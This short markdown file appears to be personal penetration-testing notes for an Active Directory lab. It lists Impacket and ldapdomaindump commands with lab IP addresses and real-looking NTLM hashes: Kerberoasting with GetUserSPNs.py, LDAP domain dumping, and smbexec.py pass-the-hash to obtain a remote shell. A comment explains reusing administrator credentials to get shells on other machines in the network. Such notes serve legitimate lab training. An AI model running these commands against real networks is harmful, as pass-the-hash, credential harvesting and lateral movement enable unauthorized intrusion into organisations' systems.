# IMPACKET 

## GetUserSPNs.py

```
GetUserSPNs.py -target-domain 10.11.1.120 -usersfile user.txt xor/xor-app59$ -hashes aad3b435b51404eeaad3b435b51404ee:fae1996d4e60ca36fbae340693078c6a
```

## ldapdomaindump

```
ldapdomaindump -n 10.11.1.120 ldap://xor-dc01.xor.com --user 'xor\xor-app59$' -at NTLM
```

## open port 445 - NOTE: if you administrator credentials of one of the host in a network you can used it to have shell on other machines inside the network - just change the subdomain
```
smbexec.py -dc-ip 10.11.1.24 svclient73/administrator@10.11.1.24 -hashes aad3b435b51404eeaad3b435b51404ee:ee0c207898a5bccc01f38115019ca2fb
```